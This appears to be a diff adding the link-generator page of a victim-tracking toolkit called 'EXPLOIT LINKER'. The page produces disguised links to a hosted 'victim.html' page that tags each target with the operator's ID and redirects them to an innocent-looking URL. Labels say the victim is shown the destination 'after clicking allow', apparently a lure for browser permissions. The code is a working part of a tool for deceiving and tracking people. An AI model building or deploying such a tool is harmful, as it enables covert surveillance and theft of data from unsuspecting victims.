@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Generator | CyberCore</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .glow-input:focus { box-shadow: 0 0 15px rgba(34, 197, 94, 0.3); border-color: #22c55e; }
+        .gradient-bg { background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%); }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen flex items-center justify-center p-4">
+
+    <div class="bg-white w-full max-w-lg rounded-3xl shadow-2xl overflow-hidden border border-gray-100">
+        <div class="bg-gray-900 p-8 text-center">
+            <div class="inline-block p-3 bg-green-500/20 rounded-2xl mb-4">
+                <i class="fa-solid fa-link text-3xl text-green-500"></i>
+            </div>
+            <h1 class="text-2xl font-black text-white tracking-tighter italic">EXPLOIT <span class="text-green-500">LINKER</span></h1>
+            <p class="text-gray-400 text-xs mt-1 uppercase tracking-widest">Generate Tracking URL</p>
+        </div>
+
+        <div class="p-8 space-y-6">
+            <div>
+                <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Redirect URL (Victim destination)</label>
+                <input type="text" id="redirectUrl" placeholder="https://www.youtube.com/watch?v=..." 
+                       class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none glow-input transition-all font-medium">
+                <p class="text-[10px] text-gray-400 mt-2 italic">* Victim will see this page after clicking allow.</p>
+            </div>
+
+            <button onclick="generateLink()" class="w-full bg-green-600 hover:bg-green-700 text-white font-black py-4 rounded-2xl shadow-lg shadow-green-200 transition-all uppercase tracking-widest">
+                Generate Secure Link
+            </button>
+
+            <div id="resultBox" class="hidden space-y-4 animate-fade-in">
+                <div class="p-4 bg-green-50 border-2 border-dashed border-green-200 rounded-2xl relative">
+                    <p class="text-[10px] font-bold text-green-600 mb-1 uppercase tracking-tighter">Your Tracking Link:</p>
+                    <p id="generatedLink" class="text-sm font-mono font-bold text-gray-700 break-all pr-10">Waiting...</p>
+                    <button onclick="copyLink()" class="absolute right-4 top-10 text-green-600 hover:text-green-800">
+                        <i class="fa-solid fa-copy text-xl"></i>
+                    </button>
+                </div>
+                <p class="text-center text-[10px] text-red-500 font-bold uppercase tracking-widest">⚠️ Do not share your private ID with anyone</p>
+            </div>
+            
+            <button onclick="window.location.href='dashboard.html'" class="w-full text-gray-400 text-sm font-bold hover:text-gray-600">
+                ← BACK TO TERMINAL
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Paste your Firebase Config here
+        const firebaseConfig = { /* YOUR CONFIG */ };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const userMobile = localStorage.getItem("loggedInUser");
+
+        function generateLink() {
+            const redirect = document.getElementById('redirectUrl').value;
+            if(!redirect.startsWith('http')) { alert("Enter a valid URL (with http:// or https://)"); return; }
+
+            // Aapka GitHub hosted victim page URL yahan aayega
+            const victimPageBase = "https://yourusername.github.io/your-repo/victim.html";
+            
+            // Link ke end mein user ka mobile number add kar rahe hain for tracking
+            const finalLink = `${victimPageBase}?id=${userMobile}&redirect=${btoa(redirect)}`;
+            
+            document.getElementById('generatedLink').innerText = finalLink;
+            document.getElementById('resultBox').classList.remove('hidden');
+        }
+
+        function copyLink() {
+            const link = document.getElementById('generatedLink').innerText;
+            navigator.clipboard.writeText(link);
+            alert("Link Copied to Clipboard!");
+        }
+    </script>
+</body>
+</html>
